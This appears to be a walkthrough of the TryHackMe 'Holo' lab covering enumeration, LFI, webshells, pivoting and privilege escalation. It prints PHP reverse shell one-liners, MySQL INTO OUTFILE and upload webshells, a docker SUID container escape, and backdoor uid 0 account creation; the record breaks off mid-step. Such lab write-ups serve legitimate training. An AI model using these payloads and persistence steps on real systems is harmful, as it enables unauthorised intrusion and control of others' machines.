## ![Holo](holo.png)

### Notes
I didn't follow Tryhackme lab walk-through, so if you follows this write up you will be able to discover only the flags (Task 4). Neither I use metasploit, as usual I try to avoid this tool. I used Ligolo-NG to implement pivoting and port forwarding. This really a great tool and I suggest everyone to use it.

### The challange
Connect to VPN and check your route:

    10.200.95.0     10.50.74.1      255.255.255.0   UG    1000   0        0 tun0

Check your VPN IP

    tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
    inet 10.50.74.35  netmask 255.255.255.0  destination 10.50.74.35

Start to identify hosts:

    nmap -sn 10.200.95.0/24

    Nmap scan report for 10.200.95.33
    Host is up (0.084s latency).
    Nmap scan report for 10.200.95.250
    Host is up (0.084s latency).


Fast check open ports for the 2 hosts:

    rustscan -b 900 -a 10.200.95.33 10.200.95.250
    ... 250
    PORT     STATE SERVICE REASON
    22/tcp   open  ssh     syn-ack
    1337/tcp open  waste   syn-ack
    ... 33
    PORT      STATE SERVICE REASON
    22/tcp    open  ssh     syn-ack
    80/tcp    open  http    syn-ack
    33060/tcp open  mysqlx  syn-ack

Identify services on L-SRV01

    sudo nmap -sVC -n -v -p 80,22,3306 10.200.95.33
    ...
    80/tcp   open   http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-generator: WordPress 5.5.3
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-robots.txt: 21 disallowed entries (15 shown)
    | /var/www/wordpress/index.php 
    | /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
    | /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
    | /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
    | /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
    | /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
    | /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
    |_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: holo.live
    ...

We focus on the webserver. Inspecting the home page we can see that the main image is not loaded since it use the hostname of the server, since we cannot resolve it, let's add the following to the host file:

    echo "10.200.95.33    www.holo.live" >> /etc/hosts

As suggested we can now try to discover other VHost

    ffuf -u http://10.200.95.33 -H "Host:FUZZ.holo.live" -w subdomains-top1million-110000.txt -t 3 -fw 1288
    ...
    www                     [Status: 200, Size: 21405, Words: 1285, Lines: 156, Duration: 105ms]
    dev                     [Status: 200, Size: 7515, Words: 639, Lines: 272, Duration: 69ms]
    admin                   [Status: 200, Size: 1845, Words: 453, Lines: 76, Duration: 71ms]
    www.www                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 84ms]
    ....


The fw command helps to filter false positive responses, that I don't know why, return 200 for every  word in the list.

    -fw       Filter by amount of words in response. Comma separated list of word counts and ranges

We can proceed to add the new two virtual host to our hosts file. Then I proceeded to scan the host with Nikto:

    nikto  -h 10.200.95.33
    - Nikto v2.5.0
    ...
    + /robots.txt: contains 21 entries which should be manually viewed.
    ...

Inspecting http://www.holo.live/robots.txt I found nothting, then I tried for the other sub-domains. admmin reveals interesting information:

    User-agent: *
    Disallow: /var/www/admin/db.php
    Disallow: /var/www/admin/dashboard.php
    Disallow: /var/www/admin/supersecretdir/creds.txt

Of course the access to the supersecretdir directory is forbidden.

Insepcting the source code for the application I found an interesting url parameter used to load images: view-source:http://dev.holo.live/talents.php

    ...
    <img src="img.php?file=images/amelia.jpg" alt="Image" class="img-responsive">
    ...
The application is vulnerable to LFI, and we can exploit to get some sensitive data. Since we have already found a potential sensitive file that could disclosure important information, I tried to get this file:

    http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt

The file is downloaded as img.php and inside we can filnd some credentials.

[//]: # (admin:DBManagerLogin!)

I used the credentials to access the admin app. Once logged in we can see that there is nothing we can do in pratical, I mean no way to upload o inject a webshell. Again inspecting the souce of the page I found an interesting comment:

    <!--   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->

This a PHP insturction, interesting enough has been commented using HTML, so It is rendered on the client side, indeed to use server side PHP comment. Let's try to check if there is already a webshell installed for us :):

    http://admin.holo.live/dashboard.php?cmd=whoami

The command is executed and the output returned to us:

     <h4 class="card-title"> www-data
     Visitors today</h4>

We can get the OS version as well:

    http://admin.holo.live/dashboard.php?cmd=cat%20/etc/*rel*

    <h4 class="card-title"> DISTRIB_ID=Ubuntu
    DISTRIB_RELEASE=18.04
    DISTRIB_CODENAME=bionic
    DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
    NAME="Ubuntu"
    VERSION="18.04.5 LTS (Bionic Beaver)"
    ID=ubuntu
    ...

Futher enumerations reveals that python is not installed, indeed PHP is 7.2.24, then I tried a PHP reverse shell:

    http://admin.holo.live/dashboard.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1234%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

For sake of learning this is the decoded command used:

    php -r '$sock=fsockopen("10.50.74.35",1234);exec("/bin/bash -i <&3 >&3 2>&3");'

The IP refers to my tun0 interface, of course.

Once I got a shell, inspecting network configuration:

    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.100  netmask 255.255.255.0


### Trying Privilege escaltion
At this point I performed some basic controls to try to escalate my privileges. I searched for files containing juicy information:

    grep -Ril "password" /var/www  2> /dev/null
    ...
    grep -Ril "password" /home 2> /dev/null
    ...

Nothing really interesting emerged. 
I searched for SUID file, but again, with no luck:

    find / -perm -u=s -type f 2>/dev/null
    ...
Performing other activities to find a way to escalate my privilege, but I didn't find anything.

### Pivoting
At this point I decided to move forward and perform an hosts scan on the subnet  192.168.100.0/24 using the compromised machine as pivot host. As usual to perform this task I use Ligolo-NG. I downloaded the agent from attacker machine, since wget it's not installed I used curl:

    cd /tmp && curl -O http://10.50.74.35:8000/agent
    chmod u+x agent

Then on my attacker machine configure the proxy (execute the command as root).

    ip tuntap add user root mode tun ligolo && ip link set ligolo up
Add route to the victim subnet

    ip route add 192.168.100.0/24   dev ligolo
Start the server on the attacker:

    ./ligolo_proxy -selfcert

Coming back to the victim, start the agent:

    ./agent -connect 10.50.74.35:11601 -ignore-cert

On the attacker ligolo console start the session:

    [Agent : www-data@266b41428577] » tunnel_start 
    [Agent : www-data@266b41428577] » INFO[0481] Starting tunnel to www-data@266b41428577    

Now from our machine we can perform a host discovery scan:

    nmap -sn 192.168.100.0/24
    ...
    Nmap scan report for 192.168.100.1
    Host is up (0.17s latency).
    Nmap scan report for 192.168.100.100
    Host is up (0.13s latency).

Apart the victim, we found another active host in the network, that actualy is the default GW for the subnet (route -n on the victim). Now performing a ports scanner:

    rustscan -b 900 -a 192.168.100.1
    ...
    PORT      STATE SERVICE    REASON
    22/tcp    open  ssh        syn-ack
    80/tcp    open  http       syn-ack
    3306/tcp  open  mysql      syn-ack
    8080/tcp  open  http-proxy syn-ack
    33060/tcp open  mysqlx     syn-ack

The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080. Again I used the LFI vulnerability to download <b>/etc/passwd</b> file:

    http://192.168.100.1:8080/img.php?file=/etc/passwd
Even this time I didn't find any hashed password in this file. At this point I come back to search useful information on the compromised server (192.168.100.100). I found some interesting files that I missed before:

    www-data@0609ee91af49:/var/www/admin$ ls
    ls
    action_page.php
    assets
    dashboard.php
    db_connect.php
    ...

Looking at the DB connect file we can get the credentials to access mysql DB:

    cat db_connect.php
    <?php
    
    define('DB_SRV', '192.168.100.1');
    define('DB_PASSWD', "!123SecureAdminDashboard321!");
    define('DB_USER', 'admin');
    define('DB_NAME', 'DashboardDB');
    
    $connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
    
    if($connection == false){
    
            die("Error: Connection to Database could not be made." . mysqli_connect_error());
    }
    ?>
We can try to dump the DB and proceed to download the file, if you prefer you can use the ligolo tunnel to connect directly from your machine to the remote Mysql host. For sake of learning I dumped the DB to a file, saved in a location we have write permission as user www-data, 
that of course we can reach through HTTP. The following command should be self-explanatory:

    mysqldump -u admin -h 192.168.100.1 -p DashboardDB > /var/www/wordpress/db.sql

Then we can dowload the file hitting the following URL:

    www.holo.live/db.sql

Inspecting the dump file we can found actually another user (that will be useful later) 
    
    ...
    LOCK TABLES `users` WRITE;
    /*!40000 ALTER TABLE `users` DISABLE KEYS */;
    INSERT INTO `users` VALUES ('admin','!123SecureAdminDashboard321!'),('gurag','AAAA');
    ...

Using the same approch we could try to create a reverse shell on the remote host (.1), since mysql user has the permission to write to  /var/www/wordpress location. First we can connect to the remote MySql DBMS:

    mysql -u admin -h 192.168.100.1 -p -e "select '<?php if(isset($_GET[\'c\'])) {system($_GET[\'c\']);} ?>' INTO OUTFILE '/var/www/wordpress/ws.php';"
    ...
    Enter password: !123SecureAdminDashboard321!
    ERROR 1290 (HY000) at line 1: The MySQL server is running with the --secure-file-priv option so it cannot execute this statement

But what happened here? It seems that this flag prevents us to write to a the path we specified. At this point is necessary to connect to the remote Mysql server form the attacker machine. 
This is easy (you must have mysql client installed on the attacker machine) since we have the ligolo tunnel in place. In case you stopped the agent on the victim:
restart the agent:

    /tmp/agent -connect 10.50.74.35:11601 -ignore-cert

Then from the attacker machine:

    mysql -u admin -h 192.168.100.1 -p 
    Enter password: 
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    ...

Then we can inspect the variable related to the flag:

    MySQL [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
    +------------------+----------------+
    | Variable_name    | Value          |
    +------------------+----------------+
    | secure_file_priv | /var/www/html/ |
    +------------------+----------------+
    1 row in set (0.078 sec)

So our shell must be saved according to this value, so this is the working payload:

    MySQL [(none)]> select '<?php if(isset($_GET[\'c\'])) {system($_GET[\'c\']);} ?>' INTO OUTFILE '/var/www/html/ws.php';
    Query OK, 1 row affected (0.072 sec)

Then we can access the web shell using the following URL:

    http://192.168.100.1/ws.php?c=whoami

<b>Oops! That page can’t be found.</b>
Damn, so I tried with the other http port available on the server:

    http://192.168.100.1:8080/ws.php?c=whoami

This time it worked:

    www-data

At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine on port 1222):

     http://192.168.100.1:8080/ws.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1222%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Futher investigate the server we notice that the running web app is actually a Docker container, and that the ssh server is active on the Docker interface as well (very insecure configuration):

    www-data@ip-10-200-95-33:/var/www/html$ ifconfig 
    br-19e3b4fa18b8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.1  netmask 255.255.255.0  broadcast 192.168.100.255
    ...
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.200.95.33  netmask 255.255.255.0  broadcast 10.200.95.255

Again I performed the usual step to privilege escalation. This time looking for SUID binary I found:

     find / -perm -u=s -type f 2>/dev/null
    /usr/lib/eject/dmcrypt-get-device
    ...
    /usr/bin/docker
    ...

Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). We can try a container escape tecnique to elevate to root.
It took me a while to realize what is this alpine value used in the sample command, that is the name of a running docker image:tag
We can search for running docker images as follows:

    docker images -a
    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
    ....
    <none>              <none>              d9c4bf86bc87        3 years ago         63.5MB
    ubuntu              18.04               56def654ec22        3 years ago         63.2MB

The last result row is the one we can use as value for the parameter. The command should return a shel with root privilege:

    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
    the input device is not a TTY
Investigating the error, since our current shell is not a full TTY, the solution is to get rid of the -t option. So the actual command to exploit it is:

    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt bash
    <r run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
    id
    uid=0(root) gid=0(root) groups=0(root)

Since ssh is enabled I decided to create a new user to have a persistent access to the system:

    useradd -M support-it
    passwd support-it
    New password: Pwd1234
    Retype new password: Pwd1234
    passwd: password updated successfully

Then we can login with the newly created user using the host VPN IP:

    ssh support-it@10.200.95.33
    ...
    Could not chdir to home directory /home/support-it: No such file or directory
    $ /bin/bash
    support-it@ip-10-200-95-33:/$ 

Again we can take advantage of the docker suid vulnearbility to add another user with root privileges to the box. First get the root shell:

    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
                .-/+oossssoo+/-.               root@0acf73a8ca6d 
            `:+ssssssssssssssssss+:`           -----------------                                                                                                                           
          -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.1 LTS x86_64                                                                                                               
            ................................................................                                                                                            
            `:+ssssssssssssssssss+:`                                                                                                                                                       
                .-/+oossssoo+/-.                                                                                                                                                           

    root@0acf73a8ca6d:/# 

Now we can proceed to add a new entry to the /etc/passwd file with root privilege, but first we need to generate a compliance [password hash](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow):

    openssl passwd -6 -salt xyz Pwd1234
    $6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt.

Then we can insert at the end of the /etc/passwd file the following line:

    vi /etc/passwd
    ....
    support-su:$6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt.:0:0:root:/root:/bin/bash

Actually we are inserting an alias for the root user called <b>support-su</b>. Now we can proceed to login with ssh using the newly added user:

    ssh support-su@10.200.95.33
    ...
    Last login: Mon Jun 17 22:32:35 2024 from 10.50.74.35
            .-/+oossssoo+/-.               support-su@ip-10-200-95-33 
        `:+ssssssssssssssssss+:`           -------------------------- 
    ...
    root@ip-10-200-95-33:~# 

From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:

    root@ip-10-200-95-33:~# whereis nmap
    nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz

<b>Note that we have already performed this scan through the VPN in the initial phase, but we were not able to reach all the available hosts</b>

    nmap -sn  10.200.95.0/24
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-11 07:35 UTC
    Nmap scan report for ip-10-200-95-1.eu-west-1.compute.internal (10.200.95.1)
    Host is up (0.00014s latency).
    MAC Address: 02:63:DC:A0:13:35 (Unknown)
    Nmap scan report for ip-10-200-95-30.eu-west-1.compute.internal (10.200.95.30)
    Host is up (0.00034s latency).
    MAC Address: 02:E1:49:12:02:89 (Unknown)
    Nmap scan report for ip-10-200-95-31.eu-west-1.compute.internal (10.200.95.31)
    Host is up (0.00045s latency).
    MAC Address: 02:2E:32:D4:EF:DF (Unknown)
    Nmap scan report for ip-10-200-95-32.eu-west-1.compute.internal (10.200.95.32)
    Host is up (0.00032s latency).
    MAC Address: 02:6D:98:96:8D:63 (Unknown)
    Nmap scan report for ip-10-200-95-35.eu-west-1.compute.internal (10.200.95.35)
    Host is up (0.00037s latency).
    MAC Address: 02:45:FB:50:E0:27 (Unknown)
    Nmap scan report for ip-10-200-95-250.eu-west-1.compute.internal (10.200.95.250)
    Host is up (0.00020s latency).
    MAC Address: 02:6A:9F:5F:BA:47 (Unknown)
    Nmap scan report for ip-10-200-95-33.eu-west-1.compute.internal (10.200.95.33)
    Host is up.
    Nmap done: 256 IP addresses (7 hosts up) scanned in 1.70 seconds

So we have 5 hosts, excluding L-Srv01 (current machine) and 10.200.95.1 that is the GW. We can proceed with services fingerprint as follows:

    nmap -sVC -n 10.200.95.30,31,32,35,250
    
    Nmap scan report for 10.200.95.30
    Host is up (0.00063s latency).
    Not shown: 987 closed ports
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP: 
    |     version
    |_    bind
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-11 07:45:49Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: holo.live0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: holo.live0., Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: HOLOLIVE
    |   NetBIOS_Domain_Name: HOLOLIVE
    |   NetBIOS_Computer_Name: DC-SRV01
    |   DNS_Domain_Name: holo.live
    |   DNS_Computer_Name: DC-SRV01.holo.live
    |   DNS_Tree_Name: holo.live
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-11T07:48:16+00:00
    | ssl-cert: Subject: commonName=DC-SRV01.holo.live
    | Not valid before: 2024-06-08T04:01:58
    |_Not valid after:  2024-12-08T04:01:58
    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=6/11%Time=666800B2%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    MAC Address: 02:E1:49:12:02:89 (Unknown)
    Service Info: Host: DC-SRV01; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_nbstat: NetBIOS name: DC-SRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:e1:49:12:02:89 (unknown)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-06-11T07:48:16
    |_  start_date: N/A
    
    Nmap scan report for 10.200.95.31
    Host is up (0.00041s latency).
    Not shown: 992 closed ports
    PORT     STATE SERVICE       VERSION
    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 7c:c4:6b:4c:f5:73:58:dc:d6:ac:3c:bd:21:7e:67:3b (RSA)
    |   256 f1:83:ba:c1:94:ab:35:7c:44:00:26:55:9d:13:7b:94 (ECDSA)
    |_  256 32:86:c6:52:b3:61:27:71:ff:6d:9f:8d:f9:86:16:83 (ED25519)
    80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
    |_http-title: Holo.live - Virtual Events
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
    |_http-title: Holo.live - Virtual Events
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    445/tcp  open  microsoft-ds?
    3306/tcp open  mysql?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: HOLOLIVE
    |   NetBIOS_Domain_Name: HOLOLIVE
    |   NetBIOS_Computer_Name: S-SRV01
    |   DNS_Domain_Name: holo.live
    |   DNS_Computer_Name: S-SRV01.holo.live
    |   DNS_Tree_Name: holo.live
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-11T07:48:16+00:00
    | ssl-cert: Subject: commonName=S-SRV01.holo.live
    | Not valid before: 2024-06-08T04:01:55
    |_Not valid after:  2024-12-08T04:01:55
    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
    MAC Address: 02:2E:32:D4:EF:DF (Unknown)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_nbstat: NetBIOS name: S-SRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:2e:32:d4:ef:df (unknown)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-06-11T07:48:16
    |_  start_date: N/A
    
    Nmap scan report for 10.200.95.32
    Host is up (0.00029s latency).
    Not shown: 999 filtered ports
    PORT     STATE SERVICE       VERSION
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: HOLOLIVE
    |   NetBIOS_Domain_Name: HOLOLIVE
    |   NetBIOS_Computer_Name: S-SRV02
    |   DNS_Domain_Name: holo.live
    |   DNS_Computer_Name: S-SRV02.holo.live
    |   DNS_Tree_Name: holo.live
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-11T07:48:16+00:00
    | ssl-cert: Subject: commonName=S-SRV02.holo.live
    | Not valid before: 2024-06-08T04:01:58
    |_Not valid after:  2024-12-08T04:01:58
    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
    MAC Address: 02:6D:98:96:8D:63 (Unknown)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Nmap scan report for 10.200.95.35
    Host is up (0.00040s latency).
    Not shown: 995 closed ports
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: HOLOLIVE
    |   NetBIOS_Domain_Name: HOLOLIVE
    |   NetBIOS_Computer_Name: PC-FILESRV01
    |   DNS_Domain_Name: holo.live
    |   DNS_Computer_Name: PC-FILESRV01.holo.live
    |   DNS_Tree_Name: holo.live
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-11T07:48:17+00:00
    | ssl-cert: Subject: commonName=PC-FILESRV01.holo.live
    | Not valid before: 2024-06-08T04:01:58
    |_Not valid after:  2024-12-08T04:01:58
    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
    MAC Address: 02:45:FB:50:E0:27 (Unknown)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_nbstat: NetBIOS name: PC-FILESRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:45:fb:50:e0:27 (unknown)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-06-11T07:48:17
    |_  start_date: N/A
    
    Nmap scan report for 10.200.95.250
    Host is up (0.0058s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d8:21:7f:15:75:65:77:cd:6b:47:b6:a9:ff:4e:ef:b1 (RSA)
    |   256 e6:6a:17:5c:df:57:b6:f4:ed:07:b0:c3:a4:bf:60:a5 (ECDSA)
    |_  256 df:42:4a:4d:78:04:ab:f4:e8:a9:05:24:2d:03:0a:e3 (ED25519)
    MAC Address: 02:6A:9F:5F:BA:47 (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Post-scan script results:
    | clock-skew: 
    |   0s: 
    |     10.200.95.35
    |     10.200.95.30
    |     10.200.95.31
    |_    10.200.95.32
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 5 IP addresses (5 hosts up) scanned in 224.81 seconds


From the above results we can infer that:
- .30 host is the DC:  DC-SRV01.holo.live
- .31: S-SRV01.holo.live
- .32: S-SRV02.holo.live
- .35 is probably a windows file server:  PC-FILESRV01.holo.live
- .250 is *nix box having hosting SSH server and it seems not to be part of the domain. I focused on the domain's hosts.

To spped up the interactions, we can create another ligolo tunnell to reach these hosts directly.
Again I downloaded the agent from my attacker machine on the compromised server:

    wget http://10.50.74.35:8000/agent && chmod u+x agent

Start the agent

    ./agent -connect 10.50.74.35:11601 -ignore-cert

Now on our attacker machine we have to define another interface to assigne to the ligolo tunnell:

     ip tuntap add user root mode tun ligolo2 && ip link set ligolo2 up
Add routes for the hosts (dont'use the whole /24 networks since it will conflict with the VPN)

    ip route add 10.200.95.30/32 dev ligolo2  && ip route add 10.200.95.31/32 dev ligolo2 && ip route add 10.200.95.32/32 dev ligolo2 && ip route add 10.200.95.35/32 dev ligolo2 

Start the tunnell from ligolo console using the new tun interfaces
    
    [Agent : root@ip-10-200-95-33] » tunnel_start --tun ligolo2

Then we can start to interact directly with the services for each hosts. I started to check PC-FILESRV01 to get a comprehensive view of the target system's SMB environment:

    enum4linux-ng 10.200.95.35
     ...
    [!] Aborting remainder of tests since sessions failed, rerun with valid credentials   

Same fate trying with the other hosts. There aren't shares that allows non-authenticated access, so exploit null session is not possible. I gave it a try with the credential I found but I go the same result. Then I decide to inspect the web app hosted on S-SRV01.
Visiting http://10.200.95.31 the same login page of admin.holo.live is present. I tried with the same admin credentials but an empty page is returned. I tried to access directly the dashboard, visiting http://10.200.95.31/dashboard.php, but I recived not found error.
I decided to proceed performing brute-force directory

    gobuster dir -u http://10.200.95.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ...
    Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 338] [--> http://10.200.95.31/images/]
    /img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/img/]
    /Images               (Status: 301) [Size: 338] [--> http://10.200.95.31/Images/]
    ...
    /*checkout*           (Status: 403) [Size: 302]
    /Img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/Img/]
    /phpmyadmin           (Status: 403) [Size: 421]
    /webalizer            (Status: 403) [Size: 302]
    /*docroot*            (Status: 403) [Size: 302]
    ...

Nothing really interesting emerged. Coming back to the site we found a reset password feature, that permits to enumerate users, plus disclose a token parameter passed as query string parameter:

    http://10.200.95.31/password_reset.php?user=admin&user_token=
The following message is returned:

    Sorry, no user exists on our system with that username

So having a valid user and the corresponding token (sent by email) could permits to reset the password. I decided to look form common php file to se if we can access the reset functionality directly:

    gobuster dir -u http://10.200.95.31 -w /usr/share/wordlists/Common-PHP-Filenames.txt                                

    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.php            (Status: 200) [Size: 2098]
    /login.php            (Status: 200) [Size: 208]
    /upload.php           (Status: 302) [Size: 0] [--> index.php]
    /home.php             (Status: 302) [Size: 0] [--> index.php]
    /reset.php            (Status: 302) [Size: 0] [--> index.php]
    /Index.php            (Status: 200) [Size: 2098]
    /Upload.php           (Status: 302) [Size: 0] [--> index.php]
    /Login.php            (Status: 200) [Size: 208]
    /LogIn.php            (Status: 200) [Size: 208]
    Progress: 5163 / 5164 (99.98%)
    ===============================================================
    Finished
    ===============================================================

So there is a reset and even an upload file, but without authentication we are redirected to the index page. So it seems that we have to find a valid user at first. I tried to brute force it with hydra using commons usenames wordlist but without any luck. Then I tried with the other credentials found before, dumping users table:

    http://10.200.95.31/login.php?user=gurag&password=AAAA

But I got invalid username and password, then I visited the password recovery URL:

    http://10.200.95.31/password_reset.php?user=gurag&user_token=

I got the following response:

    An email has been sent to the email associated with your username

So the user exists. But I don't have access to the token of course. I decided to inspect the flow using Burp. Inspecting the reset request I found that the user token is also returned as cookie:

    Request -->

    GET /password_reset.php?user=gurag&user_token= HTTP/1.1
    ...
    
    <-- Response
    
    HTTP/1.1 200 OK
    ...
    Set-Cookie: user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb

Actually this thing it's not so strange, sometime during the development of an application such type of things could be implemented in order to test authentication and authorization workflow. Anyway, let's try to append the cookie value to the query string parameter:

    http://10.200.95.31/password_reset.php?user=gurag&user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb

And we land to the reset page. Just insert the username as gurag, a new password and we are good to go!

    http://10.200.95.31/password_update.php?user=gurag&password=Pwd12345

You get a positive response:

    Password successfuly updated!
    HOLO{.......................}

Then we can proceed to login using the newky set password. Then we are presented with a button to uoload an image, clicking we are redirected to:

    http://10.200.95.31/img_upload.php?

Let's try to check if there are filter on the file type we can upload (of course only images should be allowed). Let's try to upload a basic webshell:

    <?php if(isset($_GET['c'])) {system($_GET['c']);} ?>


The server does not check the file type at all:


    The file ws.php has been uploaded.


We don't know where the webshell hase been uploaded, but coming back to the directory brute force excercise we can try two options:

    /images               (Status: 301) [Size: 338] [--> http://10.200.95.31/images/]
